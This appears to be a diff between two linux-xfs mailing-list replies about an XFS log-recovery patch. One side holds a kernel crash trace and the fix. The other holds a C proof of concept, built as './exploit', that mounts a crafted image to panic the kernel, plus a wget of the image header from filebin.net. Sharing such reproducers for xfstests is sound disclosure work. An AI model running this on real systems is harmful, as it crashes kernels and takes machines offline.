@@ -1,102 +1,102 @@
 Received: from mail-pj1-f42.google.com (mail-pj1-f42.google.com [209.85.216.42])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 885C446B5
-	for <linux-xfs@vger.kernel.org>; Wed, 15 Jul 2026 00:36:34 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D506425782D
+	for <linux-xfs@vger.kernel.org>; Wed, 15 Jul 2026 01:02:42 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.216.42
 ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1784075799; cv=pass; b=BzvIqtKb2rNKqKUL11x0dGYxTkSdvM5hnm+F4jTIbfEHmBIAGtV+yyG64U9LgWn22O5Z0RuC0TMHWREjlpcHD/YcTcAg93Fh7A3Pkb+Z0vIhSFMh5OOtLPKQufrcXjn3Io3X87sPv1WHTdhcX/8+pMezxAu4gXuvlYG3UIOmPH4=
+	t=1784077368; cv=pass; b=Y7R7PoUn9sxJY75ZjqefXCmgLmxeuMU1dvfjhEr7Mc5GGI4B62dpScZZbJ89pmSo9YtogwFp7u98vgcgNGSW1MFNANjOPKsEVGEAqldrSUq5S7y5tGUr6jm8Ji4MwRrwChV7ui1neYdV+PYWjpS8fSrlYzQD95br6e25pOZBjWw=
 ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1784075799; c=relaxed/simple;
-	bh=IhgagwPLcErYXsbFBMm1CziaZKavTfhArRfY6nQ1Jhk=;
+	s=arc-20240116; t=1784077368; c=relaxed/simple;
+	bh=UY7ubxjdQH0v34juZ27hcyC/XR1h8srcV8LlOOPc9wo=;
 	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
-	 To:Cc:Content-Type; b=nSfxR/SOa4nbTPBsX8HLgIkcF0m7IkwX7wqGpFGzWVN5IDqJ2s0rWLSLY6YBAnvbySnciYhN4Co8miKNP5/Ea1pmRyW9oziHrTY85kLrizuMV5H1mQeoRPJH0/X9oG7r3f3KBYa1+uPEfNW37K2rdfjCfejqKnm2d+vOL19Y3pg=
-ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=O2SdXwRp; arc=pass smtp.client-ip=209.85.216.42
+	 To:Cc:Content-Type; b=Roi0m88Qi8s1jLrOMhJcEGQuSlZrPkBAnckkAWXJA7vWowEnmLgqHqWuZ9WGy46tu7z+HCFWj2BrEmMqSIrCSjaZ0iLk1IaAomLKnSUEm42PASZLstNMnc1DBtHuB6VbRj35/W/VDE1WxYrgc2jUPjLS1juucB99nZ/sWw9yIDY=
+ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=msAA0lln; arc=pass smtp.client-ip=209.85.216.42
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="O2SdXwRp"
-Received: by mail-pj1-f42.google.com with SMTP id 98e67ed59e1d1-38125cebfdaso1893993a91.1
-        for <linux-xfs@vger.kernel.org>; Tue, 14 Jul 2026 17:36:34 -0700 (PDT)
-ARC-Seal: i=1; a=rsa-sha256; t=1784075794; cv=none;
+	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="msAA0lln"
+Received: by mail-pj1-f42.google.com with SMTP id 98e67ed59e1d1-383b4a3755fso1473020a91.3
+        for <linux-xfs@vger.kernel.org>; Tue, 14 Jul 2026 18:02:42 -0700 (PDT)
+ARC-Seal: i=1; a=rsa-sha256; t=1784077362; cv=none;
         d=google.com; s=arc-20260327;
-        b=EMKLIsGxj6iHl81KdHkSHHeoXjQ3255DixOxHl2Q6Q5+aiAC1EAq++apnW29aNme7n
-         LpVEbY2N3olnGqnl/qvGV4ksBJwjGKkrxIA9iF8SwWUK+kUTKY/MpoxUegQUXAX/Chs1
-         NQ4Q6NCxyJAR3q1wLl97f62xXF/D3ki1bf6Jv3C4kUpQaRqDyxMFcU9MCR6b+FHdC2RP
-         QqJmTtm5WmgzwgNc0GNOFaHpcvInAQtq1q1MFkWDBJ7ldoVF1hWnLgxWcrpGW7qpySdS
-         S7N5uXIYs0nmKK1XihwaXPNQTvD4NcaxjUoodTMgupJ9kloz8ZWdgOD4hgGASMUt5OYg
-         idsw==
+        b=GrKmCe/mfGkVelfR4zOk2H5AtJ1Gq1c67ULk/kZnN/ABnb5KFzrntphvDlHfYpqeuE
+         MGBltwE7qHWAgsC86kNy8kLzTTd/1Yn/8jlu/mzyyImv8C0Za2453lWf+hK2+6Guw3cR
+         Fr0BFLugzz6lO7qCbBPwwtzs3/R2as7CyK77EdjZ4SrB4310ohBMKIUOgahoSQyGeAnT
+         Buk1BnI8ULaySqPSpUUR5pu9NqsKc5Hc3ihFpcUYgBjsfiezTLvpmkpjl1VVaKsSjYrr
+         AV0tSBT/WANOXqprHaIHAVCzv2AI6TLc9XpDPedGvgL/srp9jx8wHMvB4XgghfRzZeUP
+         bgGw==
 ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
         h=content-transfer-encoding:cc:to:subject:message-id:date:from
          :in-reply-to:references:mime-version:dkim-signature;
-        bh=DBldHdbR59xzOwiGY7csdK2px0Gbv1LqenTuLfbw2nY=;
-        fh=dBPruU6GzHg4SQIDOiFL7ZXQO1P9xpX2rVCEShptJ3g=;
-        b=awATmpAvHG5XajRZf3NINsDJzcjC0txGQ+PCBKqndvucATyjHXTn5WX71WssQH31o1
-         omqKOKng2ZNugum8Hb18Km3LjyVXr0YmeIsx108Y+PLaGuNUkW79d8TDL8fB/mdisB0m
-         8dOaK1uDZcHWydDBboTtLa9jATQXgNRBqy6OTKoWjI2VP0BMpbwHiulxbYzGgr94/09V
-         WDz/j/ALj8g6VLyWGW+ifP2Ljg91V8OxIK083l/md+tkI0f5OU7aO3KDS7GX/cZA2A1w
-         uY7KdSX78OV2I0ARC8WIQ+JdYoKw1nkI1jcNr8/DN47dl8Y+bxU/sAKbk4SvOotIReOf
-         4Heg==;
+        bh=ny+Y8aJedlosdwWq4xMtvdxX6hbxb2mSbZ1S3HF7xwE=;
+        fh=YLKsVTe+jmYgZR3udSu1I+j1EMe+IQITeQfU0+6LnaU=;
+        b=ZQ0dMAaAc6C2bI4WGLwQc0kY4ckDUCdSArXiAw1BczUSBqWGpfoRmWAFkjpu2tZJS7
+         mOWM+xJXPv2APWgPXlXwQifsruDrC6BUjnhGUU6moD0BVdMLzfrNLPF1d8Z2/yD4anu0
+         r0mJhEiJuDPSxfONQJZ9NM/i75FLn1ghQWZ0AXyhme55BXVHlaMM6jNQpPhRGHpSlSqU
+         Wo9so3CX2HwS1PPeSUZCnR8XpPOa4NZfWsvfE1h8QsIPEZhwSjfC6vEVncuQ3LvnXDBI
+         t+oRIzmHKHBdlO6wvptyy1KyJUwDxCYqYEvfokBhCRtJZ+iXlXATziCyj/BSOIaWPKh8
+         ndNA==;
         darn=vger.kernel.org
 ARC-Authentication-Results: i=1; mx.google.com; arc=none
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=asu.edu; s=google; t=1784075794; x=1784680594; darn=vger.kernel.org;
+        d=asu.edu; s=google; t=1784077362; x=1784682162; darn=vger.kernel.org;
         h=content-transfer-encoding:content-type:cc:to:subject:message-id
          :date:from:in-reply-to:references:mime-version:from:to:cc:subject
          :date:message-id:reply-to:content-type;
-        bh=DBldHdbR59xzOwiGY7csdK2px0Gbv1LqenTuLfbw2nY=;
-        b=O2SdXwRp7ow2SHwf8WbnH69/ji+Q5s+R/c+ghhZiH6Yl2vl7dLs8hLWZkRr7V3tHyp
-         TwcYt7xGKmk3OZDn612p/K0uqBlkQHPMX0mNIwGp430wfC1LlkHorr2UpkY5BncgPmgx
-         oyeIASCRJ4/sp4+gWrtjJFQSs02J5bNzO4LUKPWIpT3OYXea3pGsyk7Rn8Xzq3A6Z4P3
-         Bxx3zz90OImwHsKzCBiA59MGdRwOw+bK9p35tYZadpyV+MhsKwDGXejEZzPuhPAbJdox
-         0vUq9Gtng9F1M5IluFPmLVszqNak6h+Hd15Vw1aUk54wzb0g8/mNCPwkx80krIc0WpOf
-         9Zig==
+        bh=ny+Y8aJedlosdwWq4xMtvdxX6hbxb2mSbZ1S3HF7xwE=;
+        b=msAA0llnBJQmoWQXUwE67iiHKy37Bh93Lxc7F7RXimpWt1w6wpwuItk4LTtKp7yvlZ
+         pE0wI7TzOQHBkpz8PSolHmlzNP66oVH8Ju8XE3+Cvk7he70sOwRknLKd0yB35eRgh1cy
+         EqNf1xNzYnddc+g5i6CZ1ebun8VvWUpWFGWhqKme4uYDhxOGyk3tte4Py3Vkqk5QHXEU
+         VDPXXyxMBcii+90iFm/jZ03mTG4F2JElCEric3VRDL1jkGqvDM0RT/IZfL81/Hb7Lza+
+         orkXt3RIlmVx2T+lVqKuEOmzhIfCZTpw2tuR7tMsDvr/y3xZbWtERzd+0+zAqfIFhfNR
+         nLig==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1784075794; x=1784680594;
+        d=1e100.net; s=20251104; t=1784077362; x=1784682162;
         h=content-transfer-encoding:content-type:cc:to:subject:message-id
          :date:from:in-reply-to:references:mime-version:x-gm-gg
          :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
          :content-type;
-        bh=DBldHdbR59xzOwiGY7csdK2px0Gbv1LqenTuLfbw2nY=;
-        b=IAfp334WisLDqGkqxSBDXvSlKpSSP3vgboHnZ7MZ9m/4zxcGNE7la2eqf6gROVNIhQ
-         GTRyY0AYmsxMPRoxrgwJrC/y/xlnTqYPLiOuv0oPQJVv/k9x97V+wQzdcFvDfo4q8E9K
-         JMH8hJsSEZBCaJgXwCvqDdhMPkAUVdCaIQTMk/OKXTmddG3F11ZCAkMCHqzNQRiVLJms
-         OtqC1cXoYv1ijW2wWiz3L7x7cMLHFeN36yppBqDB3fRXWbr7ivMXaiHISNovlSMbsj8W
-         rgNSXAnT7NOmoToJwbrZACy+7/lamuBeyNM8HaFpsuEQdPRZsZu0Fm5tZrthKIersSy0
-         rDeA==
-X-Forwarded-Encrypted: i=1; AHgh+RqZhw/0o5Ez/2GQ8xP/5V5lRa/CFIeXUsCjPfk6NJE6wjVoee6WX9lUoIdAizxZtH/m0vhgYE37Dik=@vger.kernel.org
-X-Gm-Message-State: AOJu0YzqvXIDcEFl5F1+uTXEBM51g9nfnvgUKTtPXQFwlzgNs18XN79Q
-	nayWC0F+/5EJp2JgL2y1FIJCZKfKHgK5psFYUWPBzyOZNvOTN/mgG8f7EOFIDK/1N9s4UgGyYmN
-	FwPd9VUxvaVJ79XJ6aEZ2EJRO2lPhxW5egYFNgqSi
-X-Gm-Gg: AfdE7ckWy4RPx+pgUFtB1Q+Sii+Wr61TZcdaYsMYHOg6TDS/wFuA9XpmM4/GMNlcdtG
-	84v0ZJeBlkvTImLfWzR7kqZTFwhdjrRPxBwZ7PGa2qgIZb5ngX2w/VfvcthmRmMBvSeQ2cLnVk8
-	/FcjVXC8S0Ha1YChqcP/HVlBdnBkQdVitGnbrwTSaWdnGTBnNpvY88DwEIx2GO8CiohjvVRWQc5
-	+LuZCjr8HN8T8cf+IbQUGI82ZirVQ5TFU3utHh1zvreMGTZMB73QzGNPUAvVTFK6CJFq9atvi7W
-	oMGYu3ekEt4fH7IB+bn4J6oO1jXbPSLe8sKQJ+k=
-X-Received: by 2002:a17:90b:264b:b0:38e:79f:76c6 with SMTP id
- 98e67ed59e1d1-38e079f7788mr7757014a91.24.1784075793850; Tue, 14 Jul 2026
- 17:36:33 -0700 (PDT)
+        bh=ny+Y8aJedlosdwWq4xMtvdxX6hbxb2mSbZ1S3HF7xwE=;
+        b=lZuRCUYg0bLwh6DaxrOc2ynVxytA6d8GNy88GA9gCiN/vBYJvfbd3+YaE/4iEx2rRL
+         GtKTWGvH6ppVMMKkiCHSmSFNGIslU+fOmeU4oK0CY8t6njLEX8QLi7VGS1NJvKDElHbq
+         EkOlbbe8ZBVaiZnEFtOm8OnGaxVBB1yQVp2SVc91e8BUDIDGiHQ/P4NFS5yxSIqdWb7j
+         m3EsftkTOPuJ3MQlikTCZoDtHq6fpdNIzKL5AnxMsvTgHOvzcS6YJlDRnXDmdj5YOeyS
+         o1CKFUNjDzy+XeYzlujkRI5R4okBqUTo+HYJBYo1PJ/jTlk2vIliVvJ8tHqX64RfBIxg
+         U05A==
+X-Forwarded-Encrypted: i=1; AHgh+RposrLDdJCDttHLIs6dhhIX8dPq3+TkjigutMqAuQ6Us4UwngxXb0JkRZFjlishehpD7lBr8uBy5+M=@vger.kernel.org
+X-Gm-Message-State: AOJu0YyTIYwY7oM2zywOVh0atNUvj2bFOSDka5Fz5R/8hp0P8VXe0rwy
+	QgCHv4uE+aPfTR6wfWE8kKbc67CJDdzX9UXb9UNEEGpN4n0XYL71YF/8kkIajgLA/e6dZWt6l0e
+	00jsIHCcEWMa5hNWItGkPPk15lefvUd+zl4Ll7JOtZ51kvi+g142OVByjno8=
+X-Gm-Gg: AfdE7cmdcjoSyQMzPVmPXN79N11dSyA/cClb7vIvOcpLjGGT8FfflAna9WAPeTwpiqy
+	SlRUtKWDRgdplZ8VAvkDcZXGKeYL33rQiY2NxIKrOzEzyBNBzcn2XXCb7x3ZiL/ykUbHxbT8L3N
+	R0mMKSLgBvBqq7LtMacOG+xPUBpfT7FcnXOFOR7x2WzZ27fmSZewZ+5F5ZxLBLsUqUUmeDOX55F
+	leBfktqtm8/myJuiOJ1mzZ7XbRTMRAD0CvLWfBDjXEStDPTFQbWRsyVL04PKC2VmLglUzVJKB3b
+	zNppdbcvAmOy1YjtUuR8knzFjWFw
+X-Received: by 2002:a17:90b:3b89:b0:387:e0db:3fad with SMTP id
+ 98e67ed59e1d1-38dc7778aedmr13995855a91.38.1784077362264; Tue, 14 Jul 2026
+ 18:02:42 -0700 (PDT)
 Precedence: bulk
 X-Mailing-List: linux-xfs@vger.kernel.org
 List-Id: <linux-xfs.vger.kernel.org>
 List-Subscribe: <mailto:linux-xfs+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-xfs+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-References: <20260712220854.3131445-1-xmei5@asu.edu> <20260713225721.GM7195@frogsfrogsfrogs>
-In-Reply-To: <20260713225721.GM7195@frogsfrogsfrogs>
+References: <20260712220854.3131445-1-xmei5@asu.edu> <alSr3bJ8yow3ID9K@infradead.org>
+In-Reply-To: <alSr3bJ8yow3ID9K@infradead.org>
 From: Xiang Mei <xmei5@asu.edu>
-Date: Tue, 14 Jul 2026 17:36:22 -0700
-X-Gm-Features: AUfX_mz0KzewxGrV4iSsWihDxa5m_UbpLckWgQr4KlMKsAhOyJCNkWHSUe8C0ew
-Message-ID: <CAPpSM+RtwKTJTwm-pRLqs5+E6DqaPgJobGdxo649NNLmsYFZ4Q@mail.gmail.com>
+Date: Tue, 14 Jul 2026 18:02:31 -0700
+X-Gm-Features: AUfX_mztmdkU4Yga2wpYw1HphT4cAw6HQeuWY0T733tvnEnUi6z4LwZd8K2vjbU
+Message-ID: <CAPpSM+QN-6pgBYLfyYVmBr1b1gXsuOgTci-4V8qwd4wewzf4Mw@mail.gmail.com>
 Subject: Re: [PATCH] xfs: reject log continuation for a header-only item in recovery
-To: "Darrick J. Wong" <djwong@kernel.org>
+To: Christoph Hellwig <hch@infradead.org>
 Cc: Carlos Maiolino <cem@kernel.org>, linux-xfs@vger.kernel.org, linux-kernel@vger.kernel.org, 
 	bestswngs@gmail.com
 Content-Type: text/plain; charset="UTF-8"
 Content-Transfer-Encoding: quoted-printable
 
-On Mon, Jul 13, 2026 at 3:57=E2=80=AFPM Darrick J. Wong <djwong@kernel.org>=
- wrote:
+On Mon, Jul 13, 2026 at 2:12=E2=80=AFAM Christoph Hellwig <hch@infradead.or=
+g> wrote:
 >
 > On Sun, Jul 12, 2026 at 03:08:54PM -0700, Xiang Mei wrote:
 > > On an XLOG_WAS_CONT_TRANS op, xlog_recover_add_to_cont_trans() extends =
@@ -119,81 +119,106 @@ ct the
 > > ri_cnt =3D=3D 0 case as corruption with -EFSCORRUPTED, which the caller=
  already
 > > propagates to abort recovery.
-> >
-> >   BUG: unable to handle page fault for address: fffffffffffffff0
-> >   #PF: supervisor read access in kernel mode
-> >   Oops: 0000 [#1] SMP KASAN NOPTI
-> >   RIP: 0010:xlog_recover_add_to_cont_trans (fs/xfs/xfs_log_recover.c:21=
-35)
-> >   Call Trace:
-> >    xlog_recovery_process_trans (fs/xfs/xfs_log_recover.c:2306)
-> >    xlog_recover_process_data (fs/xfs/xfs_log_recover.c:2500)
-> >    xlog_do_recovery_pass (fs/xfs/xfs_log_recover.c:3243)
-> >    xlog_do_log_recovery (fs/xfs/xfs_log_recover.c:3331)
-> >    xlog_do_recover (fs/xfs/xfs_log_recover.c:3368)
-> >    xlog_recover (fs/xfs/xfs_log_recover.c:3493)
-> >    xfs_log_mount (fs/xfs/xfs_log.c:617)
-> >    xfs_mountfs (fs/xfs/xfs_mount.c:1031)
-> >    xfs_fs_fill_super (fs/xfs/xfs_super.c:1940)
-> >    get_tree_bdev_flags (fs/super.c:1634)
-> >    vfs_get_tree (fs/super.c:1694)
-> >    fc_mount (fs/namespace.c:1198)
-> >    path_mount (fs/namespace.c:4161)
-> >    __x64_sys_mount (fs/namespace.c:4367)
-> >    do_syscall_64 (arch/x86/entry/syscall_64.c:94)
-> >    entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
-> >   Kernel panic - not syncing: Fatal exception
-> >
-> > Fixes: 1da177e4c3f4 ("Linux-2.6.12-rc2")
-> > Reported-by: Weiming Shi <bestswngs@gmail.com>
-> > Assisted-by: Claude:claude-opus-4-8
-> > Signed-off-by: Xiang Mei <xmei5@asu.edu>
-> > ---
-> >  fs/xfs/xfs_log_recover.c | 3 +++
-> >  1 file changed, 3 insertions(+)
-> >
-> > diff --git a/fs/xfs/xfs_log_recover.c b/fs/xfs/xfs_log_recover.c
-> > index 5f984bf5698a..fa8e04bf1aac 100644
-> > --- a/fs/xfs/xfs_log_recover.c
-> > +++ b/fs/xfs/xfs_log_recover.c
-> > @@ -2131,6 +2131,9 @@ xlog_recover_add_to_cont_trans(
-> >       item =3D list_entry(trans->r_itemq.prev, struct xlog_recover_item=
-,
-> >                         ri_list);
-> >
-> > +     if (item->ri_cnt =3D=3D 0)
-> > +             return -EFSCORRUPTED;
 >
-> Didn't Weiming Shi already post a similar patch?  Is this a duplicate,
-> or a complement?
+> Looks good:
 >
-> --D
+> Reviewed-by: Christoph Hellwig <hch@lst.de>
+>
+> Can you share your code to generate these malformed logs?  Because it
+> would be really useful  to test these conditions regularly in xfstests..
 >
 
-Thanks for the reminder. Weiming and I both pulled one crash from the
-to-report dataset: The crashes are different, but they could share the
-same root cause.
+Of course. Here is some information to reproduce the bug:
 
-After investigation, I found it's a complement. Same root cause: a
-header-only item left on r_itemq with ri_cnt =3D=3D 0 and ri_buf =3D=3D NUL=
-L.
-Proved by crashing the kernel with:
+1. CONFIGS:
+```
+CONFIG_XFS_FS=3Dy
+CONFIG_BLK_DEV_LOOP=3Dy
+CONFIG_BLK_DEV_LOOP_MIN_COUNT=3D0
+CONFIG_TMPFS=3Dy
+CONFIG_KASAN=3Dy
+CONFIG_KASAN_INLINE=3Dy
+```
 
-https://lore.kernel.org/linux-xfs/178342425117.389943.13021791343607135682.=
-b4-ty@b4/
+2. Reproducer (gcc ./exp.c -o ./exploit -lpthread -static -lz -w)
+```c
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <errno.h>
+#include <sys/ioctl.h>
+#include <sys/mount.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/sysmacros.h>
+#include <linux/loop.h>
+#include <zlib.h>
 
-Weiming's v3 3/3 guards xlog_recover_reorder_trans(), which only runs
-from xlog_recover_commit_trans() on an XLOG_COMMIT_TRANS op. This
-patch guards xlog_recover_add_to_cont_trans(), reached from the
-separate XLOG_WAS_CONT_TRANS case in xlog_recovery_process_trans().
-Please let me know if you want us to merge them into one series.
+#include "img_blob.h"
+
+#define IMG_PATH  "/tmp/poc.img"
+#define MNT_PATH  "/tmp/mnt"
+
+static void die(const char *m) { perror(m); exit(1); }
+
+static void inflate_image(void)
+{
+    unsigned char *out =3D malloc(IMG_ORIG_SIZE);
+    if (!out) die("malloc");
+
+    z_stream zs;
+    memset(&zs, 0, sizeof(zs));
+    zs.next_in =3D (unsigned char *)img_gz;
+    zs.avail_in =3D img_gz_len;
+    zs.next_out =3D out;
+    zs.avail_out =3D IMG_ORIG_SIZE;
+
+    if (inflateInit2(&zs, 15 + 16) !=3D Z_OK) die("inflateInit2");
+    if (inflate(&zs, Z_FINISH) !=3D Z_STREAM_END) die("inflate");
+    inflateEnd(&zs);
+
+    int fd =3D open(IMG_PATH, O_RDWR | O_CREAT | O_TRUNC, 0644);
+    if (fd < 0) die("open img");
+    if (write(fd, out, zs.total_out) !=3D (ssize_t)zs.total_out) die("write=
+ img");
+    close(fd);
+    free(out);
+}
+
+int main(void)
+{
+    char loopdev[64];
+
+    inflate_image();
+    mkdir(MNT_PATH, 0755);
+
+    int ctl =3D open("/dev/loop-control", O_RDWR);
+    int devnr =3D ioctl(ctl, LOOP_CTL_GET_FREE);
+    close(ctl);
+    snprintf(loopdev, sizeof(loopdev), "/dev/loop%d", devnr);
+
+    int filefd =3D open(IMG_PATH, O_RDWR);
+    if (filefd < 0) die("open img for loop");
+
+    int loopfd =3D open(loopdev, O_RDWR);
+    if (loopfd < 0) die("open loopdev");
+    if (ioctl(loopfd, LOOP_SET_FD, filefd) < 0) die("LOOP_SET_FD");
+    close(filefd);
+
+    mount(loopdev, MNT_PATH, "xfs", 0, "");
+
+    umount(MNT_PATH);
+    ioctl(loopfd, LOOP_CLR_FD, 0);
+    close(loopfd);
+    return 0;
+}
+
+```
+
+Please compile after `wget https://filebin.net/68g43o706i6a5qw5/img_blob.h`
+Please tell me if you need more information to reproduce the bug.
 
 Xiang
-> > +
-> >       old_ptr =3D item->ri_buf[item->ri_cnt-1].iov_base;
-> >       old_len =3D item->ri_buf[item->ri_cnt-1].iov_len;
-> >
-> > --
-> > 2.43.0
-> >
-> >
